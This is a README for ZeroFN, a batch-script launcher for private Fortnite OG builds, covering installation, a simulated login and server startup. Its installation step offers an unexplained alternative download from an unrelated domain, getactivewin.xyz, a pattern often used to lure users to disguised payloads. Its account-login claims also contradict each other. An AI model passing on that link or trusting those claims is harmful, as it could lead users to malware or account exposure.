# ProjectZERO-ZeroFN

ProjectZERO-ZeroFN is a custom batch script that provides a streamlined interface for downloading, managing, and launching custom Fortnite OG (Original Game) builds. It is designed to allow users to easily specify their FortniteOG path, install specific Fortnite seasons, and authenticate with Epic Games.

---

## Features

1. **Main Menu Navigation**
   - Specify FortniteOG Path
   - Install Fortnite OG builds
   - Login with Epic Games Account
   - Join the ZeroFN Discord community

2. **Fortnite OG Installation**
   - Select and download Fortnite OG files for specific seasons (e.g., Season 1, Season 2)--for now only season 2 works.
   - Extract and verify installation directories.

3. **Epic Games Login**
   - Login to your fortnite account by epic games.(using proxy for authentication back to the server)

4. **Game and Server Management**
   - Launch the ZeroFN server and Fortnite game client with necessary arguments.
   - Options to start server, launch game, or start both.

5. **Discord Community**
   - Direct access to the ZeroFN Discord community for updates and support.

---

## Prerequisites

1. **System Requirements**:
   - Windows operating system
   - Internet connection

2. **Installed Tools**:
   - Python (for the server)

---

## Installation

1. Clone the repository to your local machine:
   ```bash
   git clone https://github.com/HarrisSagiris/ZeroFN.git
   ```
   or download here : getactivewin.xyz

2. Navigate to the project directory:
   ```bash
   cd ZeroFN
   ```

3. Run the script:
   ```bash
   ZeroFN.bat
   ```

---

## Usage

1. Launch the batch script by double-clicking `ZeroFN.bat`.
2. Follow the prompts in the main menu:
   - Option 1: Specify the FortniteOG installation path if you have already downloaded the files.
   - Option 2: Download and install a specific Fortnite OG build.
   - Option 3: Log in to simulate authentication with Epic Games.
   - Option 4: Join the ZeroFN Discord community.

### Starting Server and Game

- Use the options in the secondary menu to start the ZeroFN server, launch the game, or do both simultaneously.

---

## Important Notes

1. **Fortnite Builds**:
   - Ensure your internet connection is stable for downloading large Fortnite OG files.
   - Verify that your installation directory is correct.

2. **Server Requirements**:
   - Python is required to start the ZeroFN server. Ensure Python is installed and added to your PATH.

3. **Login Simulation**:
   - The script simulates a login state for Fortnite OG builds. It does not connect to the official Epic Games servers.

---

## Troubleshooting

1. **Download Issues**:
   - If the script cannot download files, verify your internet connection.
   - Check the provided URLs in the script for accessibility.

2. **Server Not Starting**:
   - Ensure Python is correctly installed and accessible via the command line.

3. **Game Not Launching**:
   - Confirm the specified path and verify that `FortniteClient-Win64-Shipping.exe` exists.

---

## Contributors

- **@Devharris**: Core Developer
- **@Addamito**: Support and Testing

---

## Community

Join our [Discord Community](https://discord.gg/yCY4FTMPdK) for support, updates, and discussions.

---

## License

This project is licensed under the MIT License. See the LICENSE file for details.

